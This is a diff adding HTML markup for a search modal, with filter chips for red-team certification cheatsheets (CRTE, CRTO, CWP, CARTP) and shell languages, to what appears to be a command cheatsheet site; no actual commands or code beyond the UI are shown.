+<!-- Search Modal -->
+<div class="search-overlay" id="searchOverlay">
+    <div class="search-modal">
+        <div class="search-input-wrap">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
+            <input type="text" class="search-input" id="searchInput" placeholder="Search commands..." autocomplete="off" spellcheck="false" aria-label="Buscar comandos">
+            <span class="search-result-count" id="searchCount"></span>
+            <span class="search-close-hint">ESC</span>
+        </div>
+        <div class="search-filters" id="searchFilters">
+            <div class="filter-row">
+                <button class="filter-chip active" data-sheet="all">All</button>
+                <button class="filter-chip" data-sheet="CRTE">CRTE</button>
+                <button class="filter-chip" data-sheet="CRTO">CRTO</button>
+                <button class="filter-chip" data-sheet="CWP">CWP</button>
+                <button class="filter-chip" data-sheet="CARTP">CARTP</button>
+            </div>
+            <div class="filter-row">
+                <button class="filter-chip lang active" data-lang="all">All Langs</button>
+                <button class="filter-chip lang" data-lang="PowerShell">PowerShell</button>
+                <button class="filter-chip lang" data-lang="Bash">Bash</button>
+                <button class="filter-chip lang" data-lang="CMD">CMD</button>
+                <button class="filter-chip lang" data-lang="Cobalt Strike">Cobalt Strike</button>
+            </div>
+        </div>
+        <div class="search-results" id="searchResults">
+            <div class="search-empty">Type to search commands across all cheatsheets...</div>
+        </div>
+        <div class="search-footer">
+            <span><kbd>&uarr;&darr;</kbd> Navigate</span>
+            <span><kbd>&crarr;</kbd> Open</span>
+            <span><kbd>esc</kbd> Close</span>
+        </div>
+    </div>
+</div>
+
+<script src="search-index.js"></script>
+<script src="main.js"></script>
+
+</body>
+</html>
